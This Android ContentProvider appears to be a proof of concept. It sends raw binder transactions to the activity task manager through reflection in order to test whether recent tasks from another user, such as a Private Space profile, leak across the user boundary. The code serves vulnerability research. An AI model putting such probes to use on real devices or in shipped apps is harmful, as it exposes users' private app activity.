package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ActivityTaskProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("activity_task");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no binder"});
            return cursor;
        }

        String desc = "android.app.IActivityTaskManager";

        // TX=77: getLastResumedActivityUserId — which user is active
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(77, data, reply, 0);
            reply.readException();
            int userId = reply.readInt();
            cursor.addRow(new Object[]{"lastResumedUserId", String.valueOf(userId)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"lastResumedUserId", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=29: getRecentTasks(maxNum, flags, userId)
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(10); // maxNum
                data.writeInt(0);  // flags
                
                data.writeInt(userId);
                binder.transact(29, data, reply, 0);
                reply.readException();
                // ParceledListSlice<RecentTaskInfo>
                int listType = reply.readInt(); // 1 = inline list
                if (listType == 1) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"recentTasks_u" + userId, "count=" + count});
                    if (count > 0 && userId == 11) {
                        cursor.addRow(new Object[]{"recentTasks_u11",
                            "PRIVATE_SPACE_TASKS_LEAKED! " + count + " tasks"});
                    }
                } else {
                    cursor.addRow(new Object[]{"recentTasks_u" + userId, "listType=" + listType});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"recentTasks_u" + userId, "SEC:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"recentTasks_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=27: getTasks(maxNum)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(20); // maxNum
            data.writeInt(0);  // filterOnlyVisibleRecents
            data.writeInt(0);  // flags
            binder.transact(27, data, reply, 0);
            reply.readException();
            int listType = reply.readInt();
            if (listType == 1) {
                int count = reply.readInt();
                cursor.addRow(new Object[]{"runningTasks", "count=" + count});
            } else {
                cursor.addRow(new Object[]{"runningTasks", "listType=" + listType + " avail=" + reply.dataAvail()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"runningTasks", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=34: getFocusedRootTaskInfo
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(34, data, reply, 0);
            reply.readException();
            int present = reply.readInt();
            if (present != 0) {
                // RootTaskInfo contains taskId, userId, topActivity, etc
                int taskId = reply.readInt();
                cursor.addRow(new Object[]{"focusedTask", "taskId=" + taskId + " avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"focusedTask", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"focusedTask", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=30: isTopActivityImmersive
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(30, data, reply, 0);
            reply.readException();
            boolean immersive = reply.readInt() != 0;
            cursor.addRow(new Object[]{"topImmersive", String.valueOf(immersive)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"topImmersive", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=38: isInLockTaskMode
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(38, data, reply, 0);
            reply.readException();
            boolean lockTask = reply.readInt() != 0;
            cursor.addRow(new Object[]{"lockTaskMode", String.valueOf(lockTask)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"lockTaskMode", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=39: getLockTaskModeState
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(39, data, reply, 0);
            reply.readException();
            int state = reply.readInt();
            cursor.addRow(new Object[]{"lockTaskState", String.valueOf(state)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"lockTaskState", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=9: getVoiceInteractorPackageName  
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new Binder()); // activityToken
            binder.transact(9, data, reply, 0);
            reply.readException();
            String pkg = reply.readString();
            cursor.addRow(new Object[]{"voiceInteractor", pkg != null ? pkg : "null"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"voiceInteractor", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
